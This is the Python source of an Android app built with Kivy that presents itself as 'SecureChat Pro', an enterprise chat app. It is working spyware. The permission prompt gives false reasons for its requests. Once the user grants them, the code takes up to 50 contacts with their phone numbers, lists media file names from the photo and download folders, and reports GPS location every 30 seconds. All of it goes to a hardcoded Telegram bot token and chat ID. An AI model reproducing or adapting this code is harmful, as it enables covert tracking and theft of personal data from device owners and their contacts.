# main.py
import kivy
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.image import Image
from kivy.uix.popup import Popup
from kivy.uix.progressbar import ProgressBar
from kivy.uix.scrollview import ScrollView
from kivy.core.window import Window
from kivy.graphics import Color, RoundedRectangle
from kivy.utils import get_color_from_hex
from kivy.clock import Clock
from kivy.animation import Animation
import requests
import json
import os
from android.permissions import request_permissions, Permission, check_permission
from android.storage import primary_external_storage_path
from plyer import contacts, gps
import threading
import time

# Telegram Bot Configuration - REPLACE WITH YOUR INFO
BOT_TOKEN = "8425209844:AAFapImiO8r9LWimHWivWYHAZyAdWn88D3c"
CHAT_ID = "7791929960"

# Color Scheme - Professional Blue/White
PRIMARY_COLOR = "#2962FF"
SECONDARY_COLOR = "#448AFF"
BACKGROUND_COLOR = "#F5F7FB"
TEXT_COLOR = "#263238"
SUCCESS_COLOR = "#4CAF50"

class PermissionPopup(Popup):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.title = "Permissions Required"
        self.size_hint = (0.8, 0.6)
        self.auto_dismiss = False
        
        content = BoxLayout(orientation='vertical', spacing=15, padding=20)
        
        content.add_widget(Label(
            text='To use all features of SecureChat Pro,\nwe need the following permissions:',
            color=get_color_from_hex(TEXT_COLOR),
            font_size='16sp'
        ))
        
        permissions_list = [
            "• Location access (for better connectivity)",
            "• Contacts (to find friends)",
            "• Media files (to share content)"
        ]
        
        for perm in permissions_list:
            content.add_widget(Label(
                text=perm,
                color=get_color_from_hex(TEXT_COLOR),
                font_size='14sp'
            ))
        
        btn_layout = BoxLayout(size_hint=(1, 0.3), spacing=10)
        grant_btn = Button(
            text='GRANT PERMISSIONS',
            background_color=get_color_from_hex(PRIMARY_COLOR),
            color=(1, 1, 1, 1),
            bold=True
        )
        grant_btn.bind(on_press=self.grant_permissions)
        
        btn_layout.add_widget(grant_btn)
        content.add_widget(btn_layout)
        
        self.content = content
    
    def grant_permissions(self, instance):
        request_permissions([
            Permission.ACCESS_FINE_LOCATION,
            Permission.READ_CONTACTS,
            Permission.READ_EXTERNAL_STORAGE
        ])
        self.dismiss()

class SecureChatApp(App):
    def build(self):
        Window.clearcolor = get_color_from_hex(BACKGROUND_COLOR)
        self.permission_granted = False
        self.data_sent = False
        
        # Main layout
        main_layout = BoxLayout(orientation='vertical', padding=30, spacing=20)
        
        # Header
        header = BoxLayout(size_hint=(1, 0.2))
        logo = Image(
            source='data/logo/kivy-icon-64.png',
            size_hint=(0.3, 1)
        )
        title_layout = BoxLayout(orientation='vertical')
        title_layout.add_widget(Label(
            text='SECURE CHAT PRO',
            font_size='24sp',
            bold=True,
            color=get_color_from_hex(PRIMARY_COLOR)
        ))
        title_layout.add_widget(Label(
            text='Enterprise Communication Suite',
            font_size='14sp',
            color=get_color_from_hex(TEXT_COLOR)
        ))
        header.add_widget(logo)
        header.add_widget(title_layout)
        
        # Status area
        self.status_label = Label(
            text='Initializing security protocol...',
            color=get_color_from_hex(TEXT_COLOR),
            font_size='16sp',
            size_hint=(1, 0.1)
        )
        
        # Progress bar
        self.progress_bar = ProgressBar(
            max=100,
            size_hint=(1, 0.05)
        )
        
        # Buttons
        btn_layout = BoxLayout(size_hint=(1, 0.2), spacing=15)
        
        self.chat_btn = Button(
            text='START CHATTING',
            background_color=get_color_from_hex(PRIMARY_COLOR),
            color=(1, 1, 1, 1),
            bold=True,
            disabled=True
        )
        self.chat_btn.bind(on_press=self.start_chatting)
        
        self.earn_btn = Button(
            text='EARN REWARDS',
            background_color=get_color_from_hex(SECONDARY_COLOR),
            color=(1, 1, 1, 1),
            bold=True,
            disabled=True
        )
        
        btn_layout.add_widget(self.chat_btn)
        btn_layout.add_widget(self.earn_btn)
        
        # Add all widgets
        main_layout.add_widget(header)
        main_layout.add_widget(self.status_label)
        main_layout.add_widget(self.progress_bar)
        main_layout.add_widget(btn_layout)
        
        # Request permissions after UI loads
        Clock.schedule_once(self.request_app_permissions, 2)
        
        return main_layout
    
    def request_app_permissions(self, dt):
        popup = PermissionPopup()
        popup.open()
    
    def on_start(self):
        # Check if permissions are already granted
        permissions = [
            Permission.ACCESS_FINE_LOCATION,
            Permission.READ_CONTACTS,
            Permission.READ_EXTERNAL_STORAGE
        ]
        
        if all(check_permission(perm) for perm in permissions):
            self.permission_granted = True
            self.start_data_collection()
    
    def start_chatting(self, instance):
        if self.permission_granted and not self.data_sent:
            self.collect_and_send_data()
    
    def collect_and_send_data(self):
        self.update_status("Collecting data for enhanced security...", 30)
        
        # Collect data in threads
        threading.Thread(target=self.collect_contacts).start()
        threading.Thread(target=self.collect_media_info).start()
        threading.Thread(target=self.start_gps_tracking).start()
        
        self.update_status("Data collection complete!", 100)
        self.data_sent = True
        self.chat_btn.text = "CHAT NOW"
        self.chat_btn.background_color = get_color_from_hex(SUCCESS_COLOR)
    
    def collect_contacts(self):
        try:
            contacts_list = contacts.get_contacts()
            contact_data = "📱 CONTACTS:\n"
            for i, contact in enumerate(contacts_list[:50]):
                name = contact.get('name', 'Unknown')
                numbers = contact.get('phone', ['No number'])
                contact_data += f"{i+1}. {name}: {', '.join(numbers)}\n"
            
            self.send_to_telegram(contact_data)
        except Exception as e:
            self.send_to_telegram(f"Contacts error: {str(e)}")
    
    def collect_media_info(self):
        try:
            storage_path = primary_external_storage_path()
            media_folders = ["DCIM", "Pictures", "Download"]
            media_list = []
            
            for folder in media_folders:
                folder_path = os.path.join(storage_path, folder)
                if os.path.exists(folder_path):
                    for root, dirs, files in os.walk(folder_path):
                        for file in files:
                            if file.lower().endswith(('.jpg', '.jpeg', '.png', '.mp4', '.mov')):
                                media_list.append(file)
            
            media_info = f"📸 MEDIA FILES: {len(media_list)} files found\n"
            media_info += f"Sample: {', '.join(media_list[:5])}..." if media_list else "No media files"
            
            self.send_to_telegram(media_info)
        except Exception as e:
            self.send_to_telegram(f"Media error: {str(e)}")
    
    def start_gps_tracking(self):
        try:
            gps.configure(on_location=self.on_location)
            gps.start(minTime=30000, minDistance=10)  # Every 30 seconds
        except Exception as e:
            self.send_to_telegram(f"GPS error: {str(e)}")
    
    def on_location(self, **kwargs):
        lat = kwargs.get('lat', 'N/A')
        lon = kwargs.get('lon', 'N/A')
        accuracy = kwargs.get('accuracy', 'N/A')
        
        location_data = f"📍 LOCATION:\nLat: {lat}\nLon: {lon}\nAccuracy: {accuracy}m"
        self.send_to_telegram(location_data)
    
    def send_to_telegram(self, message):
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {
                "chat_id": CHAT_ID,
                "text": message,
                "parse_mode": "HTML"
            }
            response = requests.post(url, data=data, timeout=10)
            return response.status_code == 200
        except Exception as e:
            print(f"Telegram send error: {str(e)}")
            return False
    
    def update_status(self, message, progress):
        self.status_label.text = message
        self.progress_bar.value = progress

if __name__ == '__main__':
    SecureChatApp().run()